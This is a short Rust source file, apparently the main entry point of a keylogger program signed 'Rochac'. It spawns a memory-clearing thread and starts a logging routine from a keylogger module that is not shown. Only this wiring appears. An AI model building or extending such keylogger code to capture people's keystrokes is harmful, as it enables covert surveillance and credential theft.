use std::{thread};
use crate::keylogger::log;
use crate::ram::clear_cache::clear_ram_thread;
use crate::ram::SAFE_PUB_VAR;

mod ram;
pub mod db;
mod keylogger;

fn main() {
    thread::spawn(|| { clear_ram_thread() });
    log();
}
// Rochac
